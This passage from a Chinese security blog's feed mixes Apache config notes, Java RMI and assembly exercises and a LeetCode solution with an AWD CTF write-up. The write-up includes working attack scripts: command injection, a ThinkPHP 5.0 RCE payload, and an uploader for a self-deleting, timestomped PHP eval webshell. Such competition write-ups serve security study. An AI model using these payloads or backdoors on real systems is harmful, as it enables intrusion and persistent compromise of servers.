      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="thinkphp" scheme="http://prontosil.com/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>apache配置文件简单记录</title>
    <link href="http://prontosil.com/posts/a3f2ee6b/"/>
    <id>http://prontosil.com/posts/a3f2ee6b/</id>
    <published>2020-03-14T13:23:42.000Z</published>
    <updated>2020-03-15T11:42:38.520Z</updated>
    
    <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><pre><code>&lt;VirtualHost *:80&gt;        # The ServerName directive sets the request scheme, hostname and port that        # the server uses to identify itself. This is used when creating        # redirection URLs. In the context of virtual hosts, the ServerName        # specifies what hostname must appear in the request&#39;s Host: header to        # match this virtual host. For the default virtual host (this file) this        # value is not decisive as it is used as a last resort host regardless.        # However, you must set it for any further virtual host explicitly.        #ServerName www.example.com        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,        # error, crit, alert, emerg.        # It is also possible to configure the loglevel for particular        # modules, e.g.        #LogLevel info ssl:warn        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined        # For most configuration files from conf-available/, which are        # enabled or disabled at a global level, it is possible to        # include a line for only one particular virtual host. For example the        # following line enables the CGI configuration for this host only        # after it has been globally disabled with &quot;a2disconf&quot;.        #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直不太清楚apache的配置文件，简单记录一下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/apache2&lt;/code&gt; 下的文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;apache2.conf&lt;/code&gt; 是主配置文件，之后的 &lt;code&gt;available&lt;/code&gt; 代表可用的, 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="apache" scheme="http://prontosil.com/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>星盟3月AWD比赛</title>
    <link href="http://prontosil.com/posts/f1d265cd/"/>
    <id>http://prontosil.com/posts/f1d265cd/</id>
    <published>2020-03-14T10:37:47.000Z</published>
    <updated>2020-03-15T11:42:38.523Z</updated>
    
    <content type="html"><![CDATA[<p>又双叒叕的打了一次AWD比赛，简单地总结一下</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h3><p>最开始放了web2，ssh连上去，d盾没扫出什么东西</p><p>然后开始一个个看(现在都流行不放shell，直接给flag的2333)</p><p><img src="/posts/f1d265cd/1584182423201.png" alt></p><p>丢给群里的其他师傅开始写批量</p><pre><code class="python">import requestsimport report = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]url = &#39;http://ip:{port}/login.php&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    if r.status_code == 200:        try:            print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])        except IndexError:            pass</code></pre><p>批量交flag(后来发现平台有设置csrf token。导致无法批量交。)</p><pre><code class="python">send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}for flag in submit_flag:    data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}    requests.post(url=send_url,data=data,cookies=cookie)</code></pre><p>最后合并为十分钟交一次</p><pre><code class="python">import requestsimport refrom time import sleepwhile True:    port = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]    url = &#39;http://ip:{port}/login.php&#39;    submit_flag = []    for i in port:        r = requests.get(url=url.format(port=str(i)))        if r.status_code == 200:            try:                submit_flag.append(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])            except IndexError:                pass    send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;    cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}    for flag in submit_flag:        data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}        req = requests.post(url=send_url,data=data,cookies=cookie)        if &#39;incorrect&#39; not in req.text:            print(&#39;提交正确&#39;)    sleep(600)</code></pre><p>ps.赛后师傅说并没有换cookie，用下面的代码就能批量交。</p><p><img src="/posts/f1d265cd/1584186516112.png" alt></p><h3 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h3><p>看到 <code>test.sql</code> 中是有用户名和密码的，登录之后有上传点</p><p>黑名单只有这几个。。而且htaccess还写错了，php5,php7,phtml也都没有过滤，不过上传之后还是会重命名，算是也过滤了 <code>.htaccess</code> </p><pre><code>$black_list = [&quot;ini&quot;,&quot;htacces&quot;,&quot;php&quot;,&quot;ph3&quot;,&quot;html&quot;];$ext=pathinfo($name)[&#39;extension&#39;];$ext =strtolower($ext);</code></pre><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="md文件解析漏洞"><a href="#md文件解析漏洞" class="headerlink" title="md文件解析漏洞"></a>md文件解析漏洞</h3><p>这个web套路好深2333</p><p>d盾可以扫到一个shell，但是是在markdown文件中，还有一个是库中的回调函数</p><p><img src="/posts/f1d265cd/1584182744449.png" alt></p><p>最开始以为是d盾误报，结果后来看了一眼 <code>.htaccess</code></p><pre><code>AddType application/x-httpd-php .html .md</code></pre><p>居然将markdown文件解析为php….这个思路挺强的</p><p>但是由于发现的比较晚，貌似都修好了</p><h3 id="ping命令执行"><a href="#ping命令执行" class="headerlink" title="ping命令执行"></a>ping命令执行</h3><pre><code class="php">function waf($str){    $str=str_replace(&#39; &#39;,&#39;&#39;,$str);    $str=str_replace(&#39;;&#39;,&#39;&#39;,$str);    $str=str_replace(&#39;|&#39;,&#39;&#39;,$str);    return $str;}function ping($host){    $host=waf($host);    var_dump($host);    system(&quot;ping -c 1 $host&quot;);}if(isset($_REQUEST[1]))    ping($_REQUEST[1]);</code></pre><p>这个命令执行倒是挺简单的， <code>&amp;cat&lt;/flag</code> 即可</p><pre><code class="python">import requestsimport report = [30180,30280,30680,30780,30980,31180,31280,31380,31480,31580,31780,31880,31980,32080,32180,32280,32380,32480,31080,30580,30380,30480,30880,31680]url = &#39;http://ip:{port}/common/function.php?1=&amp;cat&lt;/flag&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    try:        print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])    except IndexError:        pass</code></pre><h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>审计源码发现 <code>admin, admin</code>  即可登陆</p><p>然后有文件上传点，直接传shell.md即可解析</p><p>事后写了一个批量上传不死马的脚本</p><pre><code class="python">import requestsimport hashlibbs_webshell = &quot;&quot;&quot;&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#39;%s&#39;;    $code = &#39;&lt;?php if($_POST[&quot;pass&quot;]==&quot;%s&quot;){@eval($_POST[1]);}?&gt;&#39;;    while (1) {        file_put_contents($file, $code);        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; %s&#39;);        usleep(50);    }?&gt;&quot;&quot;&quot;secret = &quot;pxy&quot;shell_path = &quot;.pxy.php&quot;def md5_hash(s):    return hashlib.md5(s.encode()).hexdigest()def generateShell(ip):    pwd = md5_hash(secret + ip)    shell = bs_webshell % (shell_path, pwd, shell_path)    print(shell)    return shelldef checkShell(ip,shell_path):    url = &#39;http://%s/%s&#39; % (ip, shell_path)    try:        res = requests.get(url, timeout=3)    except:        pass    pwd = md5_hash(secret + ip)    res = requests.post(url, data={&#39;pass&#39;: pwd, &#39;1&#39;: &#39;echo(123);&#39;})    print(res.text)    if res.text == &#39;123&#39;:        print(&#39;[+]&#39;+ip,&#39;Check OK&#39;)ports = [30180,30280,30380,30480,30580,30680,30780,30880,30980,31080,31180,31280,31380,31480,31580,31680,31780,31880,31980,33080,32180,32280,32380,32480]ip = &quot;127.0.0.1&quot;for i in ports:    files = {&quot;pic&quot;:(&#39;shell.md&#39;, generateShell(ip), &#39;application/octet-stream&#39;)}    cookies = dict(PHPSESSID=&#39;fjue55il5q0v90fp8l66us6hq0&#39;)    url = &quot;http://&quot;+ip+&quot;:&quot;+str(i)    url_upload = url+&quot;/index.php?c=User&amp;a=upload&quot;    r = requests.post(url=url_upload,files=files, cookies=cookies)    if b&quot;successfully&quot; in r.content:        print(&quot;[+]&quot;+ip+&quot;:&quot;+str(i)+&quot; upload success&quot;)    url_1 = url + &quot;/upload/admin_shell.md&quot;    try:        r = requests.get(url_1,timeout=2)    except requests.exceptions.ReadTimeout:        checkShell(ip, &quot;upload/.pxy.php&quot;)</code></pre><p>后来研究发现，其实文件上传不仅仅是</p><pre><code>/index.php?c=User&amp;a=upload</code></pre><p>也可以</p><pre><code>/index.php?c=File&amp;a=save</code></pre><p>因为 <code>index.php</code> 是这样写的</p><pre><code class="php">$c=isset($_GET[&#39;c&#39;])?$_GET[&#39;c&#39;]:&#39;User&#39;;$a=isset($_GET[&#39;a&#39;])?$_GET[&#39;a&#39;]:&#39;Index&#39;;$obj=run_c($c);run_a($obj,$a);</code></pre><p>URL格式为：</p><pre><code>http://localhost/index.php?c=User&amp;a=home</code></pre><p>就是可以调用任意类的任意方法</p><p>ps比赛的时候我们是这么想的：</p><p>看到 <code>base.php</code> 中实例化了 <code>Smarty</code> </p><p><img src="/posts/f1d265cd/1584186763035.png" alt></p><p>之后看到这里有一处eval。</p><p><img src="/posts/f1d265cd/1584186784920.png" alt></p><p>于是就开始想能不能getshell，但是无果。</p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>感谢a2u13师傅</p><p>还是接前面的分析，可以执行任意类的任意方法。但是那个地方是字符串拼接！。</p><p>所以可以直接通过 <code>;</code> 进行命令注入</p><p><img src="/posts/f1d265cd/1584188249191.png" alt></p><p>File类需要登陆才能使用，换一个 <code>User</code>类就行</p><p><img src="/posts/f1d265cd/1584188382658.png" alt></p><p>比赛的时候确实没往这块想，还是要加强代码审计啊</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><pre><code class="php">&lt;?phpclass home{    public $method;    public $args;    function __construct($method, $args) {        $this-&gt;method = $method;        $this-&gt;args = $args;    }    function __destruct(){        var_dump($this-&gt;method);        ($this-&gt;method)($this-&gt;args);    } }     $a=$_REQUEST[&#39;a&#39;];    @unserialize($a);     ?&gt;</code></pre><p>看上去挺像反序列化的，但是</p><pre><code>($this-&gt;method)($this-&gt;args);</code></pre><p>这里是报错的，所以比赛的时候没法利用</p><p>复盘的时候才意识到原来只有php7才可以这么用</p><p>经过测试发现只能直接动态调用system函数，eval和assert都是不行的</p><p><img src="/posts/f1d265cd/1584191203655.png" alt></p><p><img src="/posts/f1d265cd/1584191226590.png" alt="eval是不行的"></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是最后放出来的，为了提高挑战性不给ssh密码。</p><p>但是稍微看两眼就会发现是tp5.0写的，还开了debug，于是直接RCE了</p><pre><code class="python">import requestsimport report = [10180,10280,10380,10480,10580,10680,10780,10880,10980,11080,11180,11280,11380,11480,11580,11680,11780,11880,11980,12080,12180,12280,12380,12480]url_flag = &#39;http://ip:{port}/public/index.php?s=captcha&#39;data = {&#39;_method&#39;:&#39;__construct&#39;,        &#39;filter[]&#39;:&#39;system&#39;,        &#39;method&#39;:&#39;get&#39;,&#39;get[]&#39;:&#39;cat /flag&#39;}for i in port:    r = requests.post(url=url_flag.format(port=str(i)),data=data)    if r.status_code == 200:        try:            print((re.findall(r&quot;(flag{.*})&quot;,r.text)[0]))        except IndexError:            pass</code></pre><p>这一波flag还是挺舒服的，但是遗憾的是没法修啊。。</p><p><img src="/posts/f1d265cd/1584183311879.png" alt></p><p>不过后来意识到可以直接将 <code>/var/www/html</code> 下的文件打包下载，还可以自己往里面写shell然后蚁剑连接进行修改。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;又双叒叕的打了一次AWD比赛，简单地总结一下&lt;/p&gt;
&lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web2&lt;/h2&gt;&lt;h3 id=&quot;直接读flag&quot;&gt;&lt;a href=&quot;#直接读flag&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="AWD" scheme="http://prontosil.com/tags/AWD/"/>
    
      <category term="总结" scheme="http://prontosil.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>jndi注入</title>
    <link href="http://prontosil.com/posts/aba5931d/"/>
    <id>http://prontosil.com/posts/aba5931d/</id>
    <published>2020-03-12T14:05:48.000Z</published>
    <updated>2020-03-15T11:42:38.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote{    public String hello() throws RemoteException;}</code></pre><p>对应的实现</p><pre><code class="java">import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;/** * @description: Hello实现 * @author: Pxy * @create: 2020-03-12 22:15 **/public class RemoteHello extends UnicastRemoteObject implements Hello{    protected RemoteHello() throws RemoteException {        super();    }    public String  hello() throws RemoteException {        return &quot;hello&quot;;    }}</code></pre><p>创建一个服务端</p><pre><code class="java">import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;/** * @description: RMI服务器 * @author: Pxy * @create: 2020-01-20 08:45 **/public class RMIServer {    public void start() throws Exception{        RemoteHello h = new RemoteHello();        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);    }    public static void main(String[] args) throws Exception {        RMIServer rmiServer = new RMIServer();        rmiServer.start();    }}</code></pre><p>客户端进行访问</p><pre><code class="java">import java.rmi.Naming;/** * @description: RMI客户端 * @author: Pxy * @create: 2020-01-20 08:57 **/public class TrainMain {    public static void main(String[] args) throws Exception {        Hello hello = (Hello) Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);        System.out.println(hello.hello());    }}</code></pre><p>这样就能实现RMI</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;示例&quot;&gt;&lt;a href=&quot;#示例&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h2&gt;&lt;p&gt;Hello接口&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;java&quot;&gt;import java.rmi.Remote;
import jav
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="jndi" scheme="http://prontosil.com/tags/jndi/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土五</title>
    <link href="http://prontosil.com/posts/7fad3d80/"/>
    <id>http://prontosil.com/posts/7fad3d80/</id>
    <published>2020-03-10T13:35:17.000Z</published>
    <updated>2020-03-10T14:46:52.901Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土四</title>
    <link href="http://prontosil.com/posts/624f5fc5/"/>
    <id>http://prontosil.com/posts/624f5fc5/</id>
    <published>2020-03-10T13:32:20.000Z</published>
    <updated>2020-03-10T14:46:52.902Z</updated>
    
    <content type="html"><![CDATA[<p>BX 寄存器在内存寻址的作用</p><p><img src="/posts/624f5fc5/1583847161633.png" alt></p><pre><code>mov ax, 2000Hmov ds,axmov bx,1000Hmov ax,[bx]  ; AX=00BEHinc bxinc bxmov [bx],ax  ; BX=1002inc bxinc bxmov [bx],ax  ; BX=1004inc bxmov [bx],al  ; BX=1005inc bx       mov [bx],al  ; BX=1006</code></pre><p>最后得到的内存分布</p><p><img src="/posts/624f5fc5/1583847171666.png" alt></p><h2 id="loop指令的使用"><a href="#loop指令的使用" class="headerlink" title="loop指令的使用"></a>loop指令的使用</h2><pre><code>assume cs:codecode segment    mov ax,2    mov cx,11s:  add ax,ax    loop s</code></pre><p>cx 作为循环的计数器</p><p>计算乘法，123*236</p><pre><code>assume cs:codecode segment    mov ax,0    mov cx,236s:  add ax,123    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><blockquote><p>注意：在汇编程序中，数据不能以字母开头</p></blockquote><p><code>g</code> 指令可以直接执行到指定的位置</p><p><code>p</code> 会自动重复直到 <code>cx == 0</code> 为止</p><h2 id="Debug和masm对指令的不同处理"><a href="#Debug和masm对指令的不同处理" class="headerlink" title="Debug和masm对指令的不同处理"></a>Debug和masm对指令的不同处理</h2><p>在汇编源程序中，我们需要这么写</p><pre><code>mov ax, 2000hmov ds, axmov al, ds:[0]</code></pre><p>如果没有指定段寄存器</p><pre><code>mov al,[0]</code></pre><p>则 <code>masm</code> 理解成</p><pre><code>mov al, 0</code></pre><p>当然如果是寄存器的话</p><pre><code>mov al, [bx]</code></pre><p>则段寄存器默认存在是 ds</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>计算 <code>ffff:0 ~ ffff:b</code> 单元中的数据的和，结果存储在 dx 中</p><p>由于每一个数据都是字节的，不能直接加到16位的寄存器dx中，那么我们是不是可以用dh和dl呢，但是这样可能导致进位丢失</p><p>所以我们需要将8位的数据赋值到16位寄存器然后再与dx相加</p><pre><code class="x86asm">assume cs:codecode segment    mov ax,0ffffh ; 注意数字不能以字母开头    mov ds,ax    mov bx,0 ;首先让 ds:bx 指向 ffff:0    mov dx,0    mov cx,12 ;进行12次循环s:  mov al,[bx]    mov ah,0  ;不要忘记给ah置0！    add dx,ax    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><h2 id="如何使用内存空间"><a href="#如何使用内存空间" class="headerlink" title="如何使用内存空间"></a>如何使用内存空间</h2><pre><code>assume cs:codecode segment    mov ax,0    mov ds,ax    mov ds:[26h], ax    mov ax,4c00h    int 21hcode endsend</code></pre><p>程序出问题了，无法继续运行</p><p><img src="/posts/624f5fc5/1583847197500.png" alt></p><p>DOS方式下，一般情况，<code>0:200 ~ 0:2ff</code> 空间中没有系统或其他程序的数据或代码</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>将内存 ffff:0 ~ ffff:b 单元中的数据复制到 0:200 ~ 0:20b 单元中</p><p>可以将两个段的地址保存到两个寄存器中</p><pre><code>assume cs:codecode segment    mov ax,0ffffh    mov ds,ax     mov ax,0020h    mov es,ax    mov bx,0    mov cx,12s:  mov dl,[bx]    mov es:[bx],dl    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ol><li>编程，向内存 0:200<del>0:23F 依次传送数据 0</del>63(3FH)</li></ol><p>代码</p><pre><code>assume cs:codecode segment    mov ax,0    mov ds,ax    mov bx,200h    mov cx,40h    mov ax,0s:  mov [bx],ax    inc ax    inc bx    loop s    mov ax, 4c00h    int 21hcode endsend</code></pre><p>运行结果</p><p><img src="/posts/624f5fc5/1583847221964.png" alt></p><ol start="2"><li>编程，向内存 0:200<del>0:23F 一次传递数据 0</del>63(3FH),程序中只能使用9条指令<br>如果只能用9条指令，那么可以这么改<pre><code>assume cs:codecode segment mov ax,0 mov ds,ax mov bx,0 mov cx,40hs:  mov [bx+200h],bx ;去掉了 ax，只用bx一个寄存器就可以做到 inc bx loop s mov ax, 4c00h int 21hcode endsend</code></pre>运行结果</li></ol><p><img src="/posts/624f5fc5/1583847232334.png" alt></p><ol start="3"><li><pre><code>assume cs:codecode segment mov ax,cs mov ds,ax mov ax,0020h mov es,ax mov bx,0 mov cx,20hs:  mov al,[bx] mov es:[bx],al inc bx loop s mov ax,4c00h int 21hcode endsend</code></pre></li></ol><p><img src="/posts/624f5fc5/1583847251042.png" alt></p><p>于是可以推测出 CX=17h</p><p>完整代码如下</p><pre><code>assume cs:codecode segment        mov ax,cs    mov ds,ax    mov ax,0020h    mov es,ax    mov bx,0    mov cx,17hs:  mov al,[bx]    mov es:[bx],al    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><p><img src="/posts/624f5fc5/1583847262812.png" alt></p><p>可以看到成功复制了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;BX 寄存器在内存寻址的作用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/624f5fc5/1583847161633.png&quot; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov ax, 2000H
mov ds,ax
mov bx,1000H
mov ax,[bx]  
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土三</title>
    <link href="http://prontosil.com/posts/2e9d33db/"/>
    <id>http://prontosil.com/posts/2e9d33db/</id>
    <published>2020-03-10T13:29:29.000Z</published>
    <updated>2020-03-10T14:46:52.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="从汇编程序开始"><a href="#从汇编程序开始" class="headerlink" title="从汇编程序开始"></a>从汇编程序开始</h2><pre><code class="x86asm">assume cs:codesgcodesg segment    mov ax,0123H    mov bx,0456H    add ax,bx    add ax,ax    mov ax,4c00H    int 21Hcodesg endsend</code></pre><p>伪指令</p><pre><code>段名 segment段名 ends</code></pre><p><code>end</code> 和 <code>ends</code> 不一样， end标记整个程序的结束<br><code>assume</code> 将有特定用途的段和相关的段寄存器关联起来</p><p>程序返回</p><pre><code>    mov ax,4c00H    int 21H</code></pre><p>编写代码，使用 MASM.exe 编译，然后使用 LINK.exe 进行链接</p><p><img src="/posts/2e9d33db/1583847029418.png" alt></p><p><img src="/posts/2e9d33db/1583847034341.png" alt></p><p>运行当然是没有结果的，我们需要使用 <code>debug</code> 调试</p><h2 id="可执行文件的加载过程"><a href="#可执行文件的加载过程" class="headerlink" title="可执行文件的加载过程"></a>可执行文件的加载过程</h2><p>程序加载的时候，找到一个段地址 <code>SA:0000</code>,程序从 <code>SA+10H:0000</code> 处开始运行，<code>SA</code> 存放在 ds寄存器中</p><p>刚加载进内存中时，</p><p><img src="/posts/2e9d33db/1583847094408.png" alt></p><p>此时看到 ds 寄存器的内容为 <code>075AH</code> ,所以程序的物理地址就是 ds+10h ,正好符合<br>在int21 时需要使用 p命令执行</p><p><img src="/posts/2e9d33db/1583847103427.png" alt></p><h2 id="实验3-编译链接跟踪"><a href="#实验3-编译链接跟踪" class="headerlink" title="实验3 编译链接跟踪"></a>实验3 编译链接跟踪</h2><pre><code class="x86asm">assume cs:codesgcodesg segment    mov ax,2000H  ; AX=2000H    mov ss,ax     ; SS=2000H    mov sp,0      ; SP=0    add sp,10     ; SP=10    pop ax        ; SP=000CH, AX=076AH    pop bx        ; SP=000EH, BX=7206H    push ax       ; SP=000CH    push bx       ; SP=000AH     pop ax        ; AX=7c06H    pop bx        ; BX=076AH    mov ax,4c00H    int 21Hcodesg endsend</code></pre><p>PSP 的头两个字节是CD20,用debug加载，查看PSP的内容</p><p><img src="/posts/2e9d33db/1583847116112.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;从汇编程序开始&quot;&gt;&lt;a href=&quot;#从汇编程序开始&quot; class=&quot;headerlink&quot; title=&quot;从汇编程序开始&quot;&gt;&lt;/a&gt;从汇编程序开始&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;x86asm&quot;&gt;assume cs:codesg

codesg se
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>每天一道leetcode-二叉树的直径</title>
    <link href="http://prontosil.com/posts/c2fa82b5/"/>
    <id>http://prontosil.com/posts/c2fa82b5/</id>
    <published>2020-03-10T13:17:16.000Z</published>
    <updated>2020-03-10T14:46:52.898Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一棵二叉树，你需要计算它的直径长度。一棵二叉树的直径长度是任意两个结点路径长度中的最大值。这条路径可能穿过根结点。</p><p>示例 :<br>给定二叉树</p><pre><code>      1     / \    2   3   / \       4   5    </code></pre><p>返回 3, 它的长度是路径 [4,2,1,3] 或者 [5,2,1,3]。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>找到左子树的节点个数，右子树的节点个数，剩下的就好做了</p><p>我写了的lj代码</p><pre><code class="java">package March;/** * @description: 二叉树的直径 * @author: Pxy * @create: 2020-03-10 20:02 **//** * [4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2] * 上面这个结果过不了 */public class diameterOfBinaryTree {    class TreeNode{        int val;        TreeNode left;        TreeNode right;        TreeNode(int x){            val = x;}    }    public int diameterOfBinaryTree(TreeNode root) {        if (root == null) {            return 0;        }        if (root.right == null) {            return helper(root.left);        } else if (root.left == null) {            return helper(root.right);        } else {            int leftLength = helper(root.left);            int rightLength = helper(root.right);            return leftLength + rightLength;        }    }    public static int helper(TreeNode root) {        if (root != null) {            return Math.max(helper(root.left), helper(root.right)) + 1;        } else {            return 0;        }    }}</code></pre><p>但是leetcode提交的时候给了一个奇葩的测试样例</p><pre><code>[4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2]</code></pre><p>这。。</p><p><img src="/posts/c2fa82b5/1583846422840.png" alt></p><p>算了我暂时也看不出哪里有问题</p><h2 id="官方"><a href="#官方" class="headerlink" title="官方"></a>官方</h2><pre><code class="java">class Solution {    int ans;    public int diameterOfBinaryTree(TreeNode root) {        ans = 1;        depth(root);        return ans - 1;    }    public int depth(TreeNode node) {        if (node == null) return 0; // 访问到空节点了，返回0        int L = depth(node.left); // 左儿子为根的子树的深度        int R = depth(node.right); // 右儿子为根的子树的深度        ans = Math.max(ans, L+R+1); // 计算d_node即L+R+1 并更新ans        return Math.max(L, R) + 1; // 返回该节点为根的子树的深度    }}</code></pre><p>思路也是比较简单的，不过这个用法很神奇，<code>depth</code> 函数有返回值，这个返回值只在递归的时候用到</p><p>java写OJ的时候如果要用全局变量，只需要在外面写一个就行了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;给定一棵二叉树，你需要计算它的直径长度。一棵二叉树的直径长度是任意两个结点路径长度中的最大值。这条路径可能穿过根结点。&lt;/p&gt;
&lt;p&gt;示例 
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="leetcode" scheme="http://prontosil.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘实验</title>
    <link href="http://prontosil.com/posts/12fff649/"/>
    <id>http://prontosil.com/posts/12fff649/</id>
    <published>2020-03-10T08:57:06.000Z</published>
    <updated>2020-03-10T09:52:51.342Z</updated>
    
